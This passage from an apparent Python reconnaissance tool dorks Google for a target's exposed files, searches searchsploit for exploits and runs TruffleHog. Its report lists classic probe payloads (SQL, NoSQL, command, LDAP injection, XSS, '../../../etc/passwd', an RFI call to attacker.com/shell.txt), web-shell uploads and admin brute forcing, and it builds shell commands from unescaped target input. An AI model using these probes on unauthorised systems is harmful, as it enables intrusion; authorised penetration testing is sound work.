                    f.write("-"*50 + "\n")
                    for url in categories[category]:
                        f.write(f"{url}\n")
            
            # ============ Attack vectors summary ============
            f.write("\n" + "="*70 + "\n")
            f.write("POTENTIAL ATTACK VECTORS\n")
            f.write("="*70 + "\n\n")
            
            if categories['admin_panels']:
                f.write("🔴 ADMIN PANEL ATTACKS:\n")
                f.write("   - Brute force admin credentials\n")
                f.write("   - Default credentials (admin:admin, admin:password)\n")
                f.write("   - Session hijacking\n")
                f.write("   - CSRF attacks on admin actions\n\n")
            
            if categories['sensitive_files'] or categories['config_files'] or categories['env_files']:
                f.write("🔴 SENSITIVE DATA EXPOSURE:\n")
                f.write("   - Check .env files for API keys, DB credentials\n")
                f.write("   - Check .git for source code exposure\n")
                f.write("   - Check config files for hardcoded credentials\n")
                f.write("   - Check database dumps for user data\n\n")
            
            if categories['upload_endpoints']:
                f.write("🔴 FILE UPLOAD VULNERABILITIES:\n")
                f.write("   - Test for unrestricted file upload\n")
                f.write("   - Try uploading web shells (php, asp, jsp)\n")
                f.write("   - Check for directory traversal in upload paths\n")
                f.write("   - Bypass file type restrictions\n\n")
            
            if categories['api_endpoints']:
                f.write("🟠 API ATTACKS:\n")
                f.write("   - Check for insecure direct object references (IDOR)\n")
                f.write("   - Test for mass assignment vulnerabilities\n")
                f.write("   - Check for rate limiting bypass\n")
                f.write("   - Look for API key exposure\n")
                f.write("   - Test for GraphQL introspection\n\n")
            
            if categories['parameters'] or categories['potential_sqli']:
                f.write("🟡 INJECTION ATTACKS:\n")
                f.write("   - SQL Injection: Test parameters with ' OR '1'='1\n")
                f.write("   - NoSQL Injection: Test with {'$ne': ''}\n")
                f.write("   - Command Injection: Test with ; ls -la\n")
                f.write("   - LDAP Injection: Test with *)(uid=*\n\n")
            
            if categories['potential_xss']:
                f.write("🟡 XSS ATTACKS:\n")
                f.write("   - Test parameters with <script>alert('XSS')</script>\n")
                f.write("   - Check for reflected XSS in search/query parameters\n")
                f.write("   - Look for stored XSS in user input fields\n\n")
            
            if categories['potential_lfi'] or categories['potential_rfi']:
                f.write("🟡 FILE INCLUSION ATTACKS:\n")
                f.write("   - LFI: Test with ../../../etc/passwd\n")
                f.write("   - RFI: Test with http://attacker.com/shell.txt\n")
                f.write("   - Check for PHP wrapper exploitation\n\n")

        print(f"\n{Colors.CYAN}📁 Detailed analysis saved: {report_file}{Colors.RESET}")

        # ============ Save categorized JSON ============
        json_file = f"{self.results_dir}/url_categories.json"
        with open(json_file, 'w') as f:
            json.dump(categories, f, indent=2)
        print(f"{Colors.CYAN}📁 JSON categories saved: {json_file}{Colors.RESET}")

        # ============ Summary ============
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 ANALYSIS SUMMARY{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total URLs Analyzed: {len(all_urls)}{Colors.RESET}")
        print(f"{Colors.RED}🔴 Critical findings: {len(categories['admin_panels']) + len(categories['sensitive_files']) + len(categories['config_files']) + len(categories['database_files']) + len(categories['backup_files']) + len(categories['git_repos']) + len(categories['env_files']) + len(categories['php_info']) + len(categories['server_status'])}{Colors.RESET}")
        print(f"{Colors.YELLOW}🟡 Potential vulnerabilities: {len(categories['parameters']) + len(categories['potential_idor']) + len(categories['potential_sqli']) + len(categories['potential_xss']) + len(categories['potential_lfi'])}{Colors.RESET}")
        print(f"{Colors.GREEN}🟢 Regular findings: {total_found - (len(categories['unknown']))}{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        return categories







    #### udork ekhane dite hobe
    # ==================== WEBDORK - FIXED VERSION ====================
    def run_webdork_fixed(self):
        """WebDork - Python 3 Fixed Version (Auto-Install + Auto-Scan)"""
        print(f"\n{Colors.CYAN}🔍 WEBDORK - FIXED VERSION (PYTHON 3){Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # ============ CREATE WEBDORK DIRECTORY ============
        webdork_dir = "./webdork_fixed"
        if not os.path.exists(webdork_dir):
            os.makedirs(webdork_dir, exist_ok=True)
            print(f"{Colors.GREEN}✅ WebDork directory created{Colors.RESET}")

        # ============ CREATE FIXED WEBDORK.PY ============
        webdork_file = f"{webdork_dir}/webdork.py"
        
        # Check if already exists
        if not os.path.exists(webdork_file):
            print(f"{Colors.CYAN}📝 Creating WebDork fixed file...{Colors.RESET}")
            
            webdork_code = '''#!/usr/bin/env python3
"""
WebDork - Fixed Python 3 Version
"""

import requests
import sys
import os
import re
import time
from urllib.parse import quote

class WebDork:
    def __init__(self):
        self.dorks = []
        self.results = []
        self.target = ""
        
    def load_dorks(self):
        dork_file = os.path.join(os.path.dirname(__file__), 'dorks.txt')
        if os.path.exists(dork_file):
            with open(dork_file, 'r') as f:
                self.dorks = [line.strip() for line in f if line.strip()]
        else:
            self.dorks = [
                f'site:{self.target} intitle:"index of"',
                f'site:{self.target} filetype:php',
                f'site:{self.target} filetype:sql',
                f'site:{self.target} filetype:conf',
                f'site:{self.target} inurl:admin',
                f'site:{self.target} inurl:login',
                f'site:{self.target} inurl:backup',
            ]
        return self.dorks
    
    def search_dork(self, dork, show=False):
        query = dork.replace('{target}', self.target)
        url = f"https://www.google.com/search?q={quote(query)}"
        
        if show:
            print(f"   🔍 Searching: {query[:80]}...")
        
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = requests.get(url, headers=headers, timeout=15)
            
            if response.status_code == 200:
                found = []
                for word in response.text.split():
                    if word.startswith("http://") or word.startswith("https://"):
                        clean = word
                        for char in ['"', "'", ",", ";", ":", "!", "?", ")", "(", "[", "]"]:
                            clean = clean.replace(char, "")
                        if "google.com" not in clean and "gstatic.com" not in clean:
                            found.append(clean)
                
                if show and found:
                    for u in found[:5]:
                        print(f"      🟢 {u}")
                elif show and not found:
                    print(f"      ⚠️ No URLs found")
                
                self.results.extend(found)
                return found
            else:
                if show:
                    print(f"      ❌ Status: {response.status_code}")
                return []
        except Exception as e:
            if show:
                print(f"      ❌ Error: {str(e)[:50]}")
            return []
    
    def run(self, target, show=False, verbose=False, output=None, delay=2, pages=2):
        self.target = target
        self.load_dorks()
        
        print(f"\\n🎯 Target: {target}")
        print(f"📊 Total dorks: {len(self.dorks)}")
        print("-" * 60)
        
        for i, dork in enumerate(self.dorks, 1):
            if verbose:
                print(f"\\n[{i}/{len(self.dorks)}] Processing...")
            
            for page in range(pages):
                if page > 0:
                    dork_with_page = f"{dork}&start={page*10}"
                else:
                    dork_with_page = dork
                self.search_dork(dork_with_page, show=show)
                time.sleep(delay)
            
            if i < len(self.dorks):
                time.sleep(delay)
        
        self.results = list(set(self.results))
        
        if output:
            with open(output, 'w') as f:
                for result in self.results:
                    f.write(f"{result}\\n")
            print(f"\\n✅ Results saved to: {output}")
        
        print(f"\\n{'='*60}")
        print(f"📊 SUMMARY")
        print(f"{'='*60}")
        print(f"Target: {target}")
        print(f"Total results: {len(self.results)}")
        
        return self.results

def main():
    import argparse
    parser = argparse.ArgumentParser(description='WebDork - Fixed')
    parser.add_argument('-cn', '--company', help='Target company/domain')
    parser.add_argument('--show', action='store_true', help='Show results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('-p', '--pages', type=int, default=2, help='Pages to search')
    parser.add_argument('--delay', type=int, default=2, help='Delay between requests')
    
    args = parser.parse_args()
    
    if not args.company:
        print("[!] Please provide a target: -cn example.com")
        sys.exit(1)
    
    webdork = WebDork()
    webdork.run(
        target=args.company,
        show=args.show,
        verbose=args.verbose,
        output=args.output,
        delay=args.delay,
        pages=args.pages
    )

if __name__ == "__main__":
    main()
'''
            
            with open(webdork_file, 'w') as f:
                f.write(webdork_code)
            
            os.chmod(webdork_file, 0o755)
            print(f"{Colors.GREEN}   ✅ WebDork fixed file created{Colors.RESET}")

        # ============ CREATE DORKS FILE ============
        dorks_file = f"{webdork_dir}/dorks.txt"
        if not os.path.exists(dorks_file):
            dorks = [
                f'site:{self.clean_target} intitle:"index of"',
                f'site:{self.clean_target} filetype:php',
                f'site:{self.clean_target} filetype:sql',
                f'site:{self.clean_target} filetype:conf',
                f'site:{self.clean_target} inurl:admin',
                f'site:{self.clean_target} inurl:login',
                f'site:{self.clean_target} inurl:backup',
                f'site:{self.clean_target} ext:php',
                f'site:{self.clean_target} ext:sql',
                f'site:{self.clean_target} "powered by"',
                f'site:{self.clean_target} "database"',
                f'site:{self.clean_target} "password"',
                f'site:{self.clean_target} "username"',
                f'site:{self.clean_target} "config"',
                f'site:{self.clean_target} "wp-config"',
                f'site:{self.clean_target} "admin login"',
            ]
            with open(dorks_file, 'w') as f:
                for dork in dorks:
                    f.write(f"{dork}\n")
            print(f"{Colors.GREEN}   ✅ Dorks file created{Colors.RESET}")

        # ============ RUN SCAN ============
        print(f"\n{Colors.BOLD}{Colors.GREEN}📦 Running WebDork Scan{Colors.RESET}")
        
        output_file = f"{self.results_dir}/webdork_results.txt"
        cmd = f"python3 {webdork_file} -cn {self.clean_target} --show -v -p 2 -o {output_file} --delay 3"
        
        print(f"{Colors.CYAN}▶️ Command:{Colors.RESET}")
        print(f"{Colors.YELLOW}   {cmd}{Colors.RESET}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.RESET}")
        
        self.run_webdork_command(cmd, "WebDork Scan")

    def run_webdork_command(self, cmd, description):
        """WebDork কমান্ড রান"""
        print(f"{Colors.CYAN}▶️ {description}{Colors.RESET}")
        print(f"{Colors.YELLOW}   {cmd}{Colors.RESET}")
        print(f"{Colors.BLUE}{'─'*70}{Colors.RESET}")
        
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            while True:
                line = process.stdout.readline()
                if line == '' and process.poll() is not None:
                    break
                if line:
                    line = line.rstrip()
                    if line:
                        if 'https://' in line or 'http://' in line:
                            print(f"{Colors.GREEN}   🟢 {line}{Colors.RESET}")
                            urls = re.findall(r'https?://[^\s]+', line)
                            self.urls.extend(urls)
                        elif 'ERROR' in line or 'error' in line.lower():
                            print(f"{Colors.RED}   ❌ {line}{Colors.RESET}")
                        elif 'blocking' in line.lower() or 'blocked' in line.lower():
                            print(f"{Colors.RED}   ⛔ BLOCKED!{Colors.RESET}")
                        elif 'Searching' in line or 'Processing' in line:
                            print(f"{Colors.YELLOW}   🔄 {line}{Colors.RESET}")
                        else:
                            print(f"   {line}")
        
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {str(e)[:100]}{Colors.RESET}")
    

    # ==================== SEARCHSPLOIT ====================
    # ==================== SEARCHSPLOIT - UPDATED VERSION ====================
    def run_searchsploit_all(self):
        """Searchsploit - Complete vulnerability search with all working options"""
        print(f"\n{Colors.CYAN}🔍 SEARCHSPLOIT - VULNERABILITY SEARCH{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        if not self.check_and_install_tool('searchsploit'):
            print(f"{Colors.RED}❌ Searchsploit not available{Colors.RESET}")
            return

        # Extract main domain/software name for better search
        search_term = self.clean_target
        # If it's a domain, extract the main name (e.g., foodnetwork from foodnetwork.com)
        if '.' in search_term:
            parts = search_term.split('.')
            if len(parts) > 2:
                search_term = parts[-2]  # Get main name
            else:
                search_term = parts[0]   # Get first part
        
        print(f"{Colors.CYAN}🔎 Searching for: {search_term}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # ============ WORKING SEARCHSPLOIT OPTIONS ============
        # Note: -a, --html, --csv flags don't work in newer versions
        test_configs = [
            {
                'name': 'Basic Search',
                'desc': 'Basic vulnerability search',
                'cmd': f"searchsploit {search_term} -o",
                'output': 'searchsploit_basic.txt'
            },
            {
                'name': 'JSON Output',
                'desc': 'Results in JSON format',
                'cmd': f"searchsploit {search_term} -j",
                'output': 'searchsploit_json.json'
            },
            {
                'name': 'Verbose Search',
                'desc': 'Detailed output with all info',
                'cmd': f"searchsploit {search_term} -v -o",
                'output': 'searchsploit_verbose.txt'
            },
            {
                'name': 'Exact Match',
                'desc': 'Exact title match search',
                'cmd': f"searchsploit {search_term} -e -o",
                'output': 'searchsploit_exact.txt'
            },
            {
                'name': 'Platform: PHP',
                'desc': 'Filter by PHP platform',
                'cmd': f"searchsploit {search_term} -t php -o",
                'output': 'searchsploit_php.txt'
            },
            {
                'name': 'Platform: WebApps',
                'desc': 'Filter by Web Applications',
                'cmd': f"searchsploit {search_term} -t webapps -o",
                'output': 'searchsploit_webapps.txt'
            },
            {
                'name': 'Platform: Windows',
                'desc': 'Filter by Windows platform',
                'cmd': f"searchsploit {search_term} -t windows -o",
                'output': 'searchsploit_windows.txt'
            },
            {
                'name': 'Platform: Linux',
                'desc': 'Filter by Linux platform',
                'cmd': f"searchsploit {search_term} -t linux -o",
                'output': 'searchsploit_linux.txt'
            },
            {
                'name': 'Remote Exploits',
                'desc': 'Filter for remote exploits',
                'cmd': f"searchsploit {search_term} -t remote -o",
                'output': 'searchsploit_remote.txt'
            },
            {
                'name': 'Local Exploits',
                'desc': 'Filter for local exploits',
                'cmd': f"searchsploit {search_term} -t local -o",
                'output': 'searchsploit_local.txt'
            }
        ]

        successful = 0
        total = len(test_configs)
        results_summary = []
        all_findings = []

        for config in test_configs:
            print(f"\n{Colors.CYAN}📝 Test: {config['name']}{Colors.RESET}")
            print(f"{Colors.BLUE}   {config['desc']}{Colors.RESET}")
            print(f"{Colors.BLUE}   Command: {config['cmd']}{Colors.RESET}")
            print(f"{Colors.YELLOW}{'─'*60}{Colors.RESET}")

            output_file = f"{self.results_dir}/{config['output']}"
            
            try:
                start_time = time.time()
                result = subprocess.run(
                    config['cmd'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                elapsed = time.time() - start_time

                if result.returncode == 0 and result.stdout:
                    # Save output
                    with open(output_file, 'w') as f:
                        f.write(result.stdout)
                    
                    # Count findings
                    lines = [l for l in result.stdout.split('\n') if l.strip()]
                    
                    # Check if any real results (not just "No Results")
                    has_results = False
                    real_results = []
                    for line in lines:
                        if 'No Results' not in line and 'Exploits:' not in line and 'Shellcodes:' not in line:
                            if line.strip():
                                has_results = True
                                real_results.append(line)
                    
                    if config['name'] == 'JSON Output':
                        count = 1
                    else:
                        count = len(lines)
                    
                    print(f"{Colors.GREEN}✅ Success!{Colors.RESET}")
                    print(f"{Colors.CYAN}   Time: {elapsed:.2f}s{Colors.RESET}")
                    print(f"{Colors.CYAN}   Output saved: {output_file}{Colors.RESET}")
                    print(f"{Colors.CYAN}   Lines: {count}{Colors.RESET}")
                    
                    if has_results:
                        print(f"{Colors.GREEN}   🎯 Found potential exploits!{Colors.RESET}")
                        all_findings.extend(real_results)
                        # Show first 3 results
                        for line in real_results[:3]:
                            print(f"{Colors.BLUE}      {line[:100]}{Colors.RESET}")
                        if len(real_results) > 3:
                            print(f"{Colors.YELLOW}      ... and {len(real_results)-3} more{Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}   📌 No exploits found for this search{Colors.RESET}")
                    
                    successful += 1
                    results_summary.append({
                        'name': config['name'],
                        'status': '✅ PASS' if has_results else '✅ PASS (No Results)',
                        'time': f"{elapsed:.2f}s",
                        'count': count,
                        'has_results': has_results
                    })
                    
                elif result.stderr:
                    print(f"{Colors.RED}❌ Failed with error:{Colors.RESET}")
                    print(f"{Colors.RED}   {result.stderr[:200]}{Colors.RESET}")
                    results_summary.append({
                        'name': config['name'],
                        'status': '❌ FAIL',
                        'time': f"{elapsed:.2f}s",
                        'count': 0,
                        'has_results': False
                    })
                else:
                    print(f"{Colors.YELLOW}⚠️ No output (exit code: {result.returncode}){Colors.RESET}")
                    results_summary.append({
                        'name': config['name'],
                        'status': '⚠️ NO OUTPUT',
                        'time': f"{elapsed:.2f}s",
                        'count': 0,
                        'has_results': False
                    })
                    
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}❌ Timeout (30s){Colors.RESET}")
                results_summary.append({
                    'name': config['name'],
                    'status': '⏱️ TIMEOUT',
                    'time': '30.00s',
                    'count': 0,
                    'has_results': False
                })
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {str(e)[:100]}{Colors.RESET}")
                results_summary.append({
                    'name': config['name'],
                    'status': '❌ ERROR',
                    'time': '0.00s',
                    'count': 0,
                    'has_results': False
                })

        # ============ TARGETED VULNERABILITY SEARCH ============
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}🎯 TARGETED VULNERABILITY SEARCH{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        vuln_patterns = [
            f"{search_term}",
            f"{search_term} admin",
            f"{search_term} login",
            f"{search_term} authentication",
            f"{search_term} bypass",
            f"{search_term} rce",
            f"{search_term} sql injection",
            f"{search_term} xss",
            f"{search_term} file inclusion",
            f"{search_term} directory traversal",
            f"{search_term} privilege escalation",
            f"{search_term} csrf",
            f"{search_term} ssrf",
            f"{search_term} lfi",
            f"{search_term} rfi"
        ]

        targeted_findings = []
        
        for pattern in vuln_patterns:
            print(f"\n{Colors.CYAN}🔍 Searching: {pattern}{Colors.RESET}")
            try:
                cmd = f"searchsploit {pattern} -o"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
                
                if result.returncode == 0 and result.stdout:
                    lines = [l for l in result.stdout.split('\n') if l.strip()]
                    real_results = []
                    for line in lines:
                        if 'No Results' not in line and 'Exploits:' not in line and 'Shellcodes:' not in line:
                            if line.strip():
                                real_results.append(line)
                    
                    if real_results:
                        print(f"{Colors.GREEN}   ✅ Found {len(real_results)} results!{Colors.RESET}")
                        targeted_findings.append({
                            'pattern': pattern,
                            'count': len(real_results),
                            'results': real_results[:5]
                        })
                        for line in real_results[:3]:
                            print(f"{Colors.BLUE}      {line[:80]}{Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}   ⚠️ No results found{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}   ⚠️ No results found{Colors.RESET}")
                    
            except subprocess.TimeoutExpired:
                print(f"{Colors.YELLOW}   ⏱️ Timeout{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}   ❌ Error: {str(e)[:50]}{Colors.RESET}")

        # ============ SAVE TARGETED FINDINGS ============
        if targeted_findings:
            with open(f"{self.results_dir}/searchsploit_vulnerabilities.txt", 'w') as f:
                f.write(f"Targeted Vulnerability Search Results for: {self.clean_target}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*70 + "\n\n")
                for vuln in targeted_findings:
                    f.write(f"Pattern: {vuln['pattern']}\n")
                    f.write(f"Results: {vuln['count']}\n")
                    f.write("-"*40 + "\n")
                    for line in vuln['results']:
                        f.write(f"{line}\n")
                    f.write("\n")
            
            print(f"\n{Colors.GREEN}✅ Vulnerability findings saved: {self.results_dir}/searchsploit_vulnerabilities.txt{Colors.RESET}")
            self.files.append(f"{self.results_dir}/searchsploit_vulnerabilities.txt")

        # ============ SUMMARY ============
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 SEARCHSPLOIT SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total tests: {total}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Successful: {successful}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {total - successful}{Colors.RESET}")
        
        # Check if any exploits found
        exploit_found = any(r.get('has_results', False) for r in results_summary)
        if exploit_found or targeted_findings:
            print(f"{Colors.GREEN}🎯 Exploits/Vulnerabilities found!{Colors.RESET}")
            total_vulns = sum(len(tf['results']) for tf in targeted_findings)
            if total_vulns > 0:
                print(f"{Colors.GREEN}   Total vulnerabilities found: {total_vulns}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}📌 No exploits found for this target.{Colors.RESET}")
            print(f"{Colors.BLUE}💡 Try searching for specific software/versions instead.{Colors.RESET}")
            print(f"{Colors.BLUE}   Example: searchsploit wordpress 5.0{Colors.RESET}")
            print(f"{Colors.BLUE}   Example: searchsploit joomla 3.9{Colors.RESET}")

        # Save all findings
        if all_findings:
            with open(f"{self.results_dir}/searchsploit_all_findings.txt", 'w') as f:
                f.write(f"All Searchsploit Findings for: {self.clean_target}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*70 + "\n\n")
                for item in all_findings:
                    f.write(f"{item}\n")
            print(f"{Colors.CYAN}📁 All findings saved: {self.results_dir}/searchsploit_all_findings.txt{Colors.RESET}")
            self.files.append(f"{self.results_dir}/searchsploit_all_findings.txt")

        print(f"{Colors.CYAN}📁 Results folder: {self.results_dir}{Colors.RESET}")

        return successful

    # ==================== TRUFFLEHOG ====================
    # ==================== TRUFFLEHOG - UPDATED VERSION ====================
    # ==================== TRUFFLEHOG - UPDATED VERSION ====================
    def run_trufflehog_all(self):
        """TruffleHog - Secret scanning using v3.96.0"""
        print(f"\n{Colors.CYAN}🔍 TRUFFLEHOG - SECRET SCANNING{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*60}{Colors.RESET}")

        # Check and install TruffleHog
        trufflehog_path = self.check_and_install_trufflehog()
        if not trufflehog_path:
            print(f"{Colors.RED}❌ TruffleHog not available{Colors.RESET}")
            return

        # Create test directory with sample files
        test_dir = f"{self.results_dir}/trufflehog_scan"
        os.makedirs(test_dir, exist_ok=True)
        
        # Sample files with secrets (for testing)
        sample_files = {
            "secrets.txt": """AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
    AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    GITHUB_TOKEN = "ghp_abc123def456ghi789jkl"
    OPENAI_API_KEY = "sk-abc123def456ghi789jkl"
    DB_PASSWORD = "SuperSecret123!"
    """,
            "config.json": """{
      "api_key": "AIzaSyC9P7sJsDbb0q9DO5CD6W9mOhp5gPpC6C8",
      "secret": "prod_secret_xyz789abc123"
    }""",
            ".env": """DATABASE_URL=postgresql://user:pass@localhost:5432/db
    SECRET_KEY=abc123def456ghi789jkl
    REDIS_URL=redis://:password@localhost:6379
    """
        }
        
        for name, content in sample_files.items():
            with open(f"{test_dir}/{name}", 'w') as f:
                f.write(content)
        
        print(f"{Colors.GREEN}✅ Test files created in: {test_dir}{Colors.RESET}")

        # ============ SCAN TYPES ============
        scan_configs = [
            {
                'name': 'Filesystem Scan',
                'desc': 'Scan filesystem for secrets',
                'cmd': f"{trufflehog_path} filesystem {test_dir} --json --no-update",
                'output': 'trufflehog_filesystem.json'
            },
            {
                'name': 'Entropy Scan',
                'desc': 'Scan with entropy detection',
                'cmd': f"{trufflehog_path} filesystem {test_dir} --json --no-update --entropy",
                'output': 'trufflehog_entropy.json'
            },
            {
                'name': 'Verified Only',
                'desc': 'Show only verified secrets',
                'cmd': f"{trufflehog_path} filesystem {test_dir} --json --no-update --only-verified",
                'output': 'trufflehog_verified.json'
            },
            {
                'name': 'Git Scan',
                'desc': 'Scan GitHub repository',
                'cmd': f"{trufflehog_path} git https://github.com/octocat/Hello-World.git --json --no-update",
                'output': 'trufflehog_git.json'
            }
        ]

        successful = 0
        total = len(scan_configs)
        all_findings = []
        results_summary = []

        for config in scan_configs:
            print(f"\n{Colors.CYAN}📝 Test: {config['name']}{Colors.RESET}")
            print(f"{Colors.BLUE}   {config['desc']}{Colors.RESET}")
            print(f"{Colors.BLUE}   Command: {config['cmd']}{Colors.RESET}")
            print(f"{Colors.YELLOW}{'─'*60}{Colors.RESET}")

            output_file = f"{self.results_dir}/{config['output']}"
            
            try:
                start_time = time.time()
                result = subprocess.run(
                    config['cmd'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                elapsed = time.time() - start_time

                # Parse JSON output
                findings = []
                if result.stdout:
                    for line in result.stdout.split('\n'):
                        if line.strip():
                            try:
                                data = json.loads(line)
                                if data:
                                    findings.append(data)
                            except:
                                pass
                
                # Save output
                with open(output_file, 'w') as f:
                    if findings:
                        json.dump(findings, f, indent=2)
                    else:
                        f.write(result.stdout if result.stdout else "No findings\n")
                
                count = len(findings)
                print(f"{Colors.GREEN}✅ Success!{Colors.RESET}")
                print(f"{Colors.CYAN}   Time: {elapsed:.2f}s{Colors.RESET}")
                print(f"{Colors.CYAN}   Output saved: {output_file}{Colors.RESET}")
                print(f"{Colors.CYAN}   Secrets found: {count}{Colors.RESET}")
                
                if findings:
                    print(f"{Colors.GREEN}   🎯 Found {count} secrets!{Colors.RESET}")
                    all_findings.extend(findings)
                    for f in findings[:3]:
                        detector = f.get('DetectorName', f.get('detector', 'Unknown'))
                        raw = f.get('Raw', f.get('raw', ''))[:50]
                        print(f"{Colors.BLUE}      - {detector}: {raw}{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}   📌 No secrets found{Colors.RESET}")
                
                successful += 1
                results_summary.append({
                    'name': config['name'],
                    'status': '✅ PASS' if findings else '✅ PASS (No Secrets)',
                    'time': f"{elapsed:.2f}s",
                    'count': count
                })
                
            except subprocess.TimeoutExpired:
                print(f"{Colors.RED}❌ Timeout (120s){Colors.RESET}")
                results_summary.append({
                    'name': config['name'],
                    'status': '⏱️ TIMEOUT',
                    'time': '120.00s',
                    'count': 0
                })
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {str(e)[:100]}{Colors.RESET}")
                results_summary.append({
                    'name': config['name'],
                    'status': '❌ ERROR',
                    'time': '0.00s',
                    'count': 0
                })

        # ============ SUMMARY ============
        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}📊 TRUFFLEHOG SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.CYAN}Total tests: {total}{Colors.RESET}")
        print(f"{Colors.GREEN}✅ Successful: {successful}{Colors.RESET}")
        print(f"{Colors.RED}❌ Failed: {total - successful}{Colors.RESET}")
        
        if all_findings:
            detectors = {}
            for s in all_findings:
                detector = s.get('DetectorName', s.get('detector', 'Unknown'))
                detectors[detector] = detectors.get(detector, 0) + 1
            
            print(f"\n{Colors.CYAN}📊 Detectors:{Colors.RESET}")
            for d, c in detectors.items():
                print(f"{Colors.BLUE}   • {d}: {c}{Colors.RESET}")
            
            with open(f"{self.results_dir}/trufflehog_all_secrets.json", 'w') as f:
                json.dump(all_findings, f, indent=2)
            print(f"{Colors.CYAN}📁 All secrets saved: {self.results_dir}/trufflehog_all_secrets.json{Colors.RESET}")
            
            with open(f"{self.results_dir}/trufflehog_secrets.txt", 'w') as f:
                f.write(f"TRUFFLEHOG SECRETS FOUND\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*70 + "\n\n")
                for s in all_findings:
                    detector = s.get('DetectorName', s.get('detector', 'Unknown'))
                    raw = s.get('Raw', s.get('raw', ''))
                    f.write(f"Detector: {detector}\n")
                    f.write(f"Value: {raw}\n")
                    f.write("-"*40 + "\n")
            print(f"{Colors.CYAN}📁 Human readable: {self.results_dir}/trufflehog_secrets.txt{Colors.RESET}")
            self.files.append(f"{self.results_dir}/trufflehog_secrets.txt")
        else:
            print(f"\n{Colors.YELLOW}⚠️ No secrets found!{Colors.RESET}")
            print(f"{Colors.BLUE}💡 This is normal for test data.{Colors.RESET}")

        print(f"{Colors.CYAN}📁 Results folder: {self.results_dir}{Colors.RESET}")
        return successful

    def check_and_install_trufflehog(self):
        """Check and install TruffleHog v3.96.0"""
        print(f"{Colors.CYAN}🔍 Checking TruffleHog...{Colors.RESET}")
        
        try:
            result = subprocess.run(['trufflehog', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{Colors.GREEN}✅ TruffleHog is already installed: {result.stdout.strip()}{Colors.RESET}")
                return 'trufflehog'
        except:
            pass
        
        print(f"{Colors.YELLOW}⚠️ TruffleHog not found. Installing v3.96.0...{Colors.RESET}")
        
        # Clean up
        subprocess.run("pip3 uninstall trufflehog -y 2>/dev/null", shell=True)
        subprocess.run("sudo pip3 uninstall trufflehog -y 2>/dev/null", shell=True)
        subprocess.run("sudo rm -f /usr/local/bin/trufflehog", shell=True)
        subprocess.run("rm -f ~/go/bin/trufflehog", shell=True)
        subprocess.run("sudo rm -rf /tmp/trufflehog", shell=True)
        subprocess.run("rm -rf /tmp/trufflehog", shell=True)
        subprocess.run("rm -f /tmp/trufflehog.tar.gz", shell=True)
        
        # Download
        version = "3.96.0"
        download_url = f"https://github.com/trufflesecurity/trufflehog/releases/download/v{version}/trufflehog_{version}_linux_amd64.tar.gz"
        tar_file = f"/tmp/trufflehog_{version}_linux_amd64.tar.gz"
        
        print(f"{Colors.BLUE}   Downloading: {download_url}{Colors.RESET}")
        
        try:
            import urllib.request
            urllib.request.urlretrieve(download_url, tar_file)
            print(f"{Colors.GREEN}   ✅ Downloaded successfully{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}   ❌ Download failed: {str(e)[:100]}{Colors.RESET}")
            return None
        
        # Extract
        print(f"{Colors.CYAN}   Extracting...{Colors.RESET}")
        extract_dir = "/tmp/trufflehog_extract"
        subprocess.run(f"rm -rf {extract_dir}", shell=True)
        os.makedirs(extract_dir, exist_ok=True)
        
        try:
            import tarfile
            with tarfile.open(tar_file, 'r:gz') as tar:
                if hasattr(tarfile, 'data_filter'):
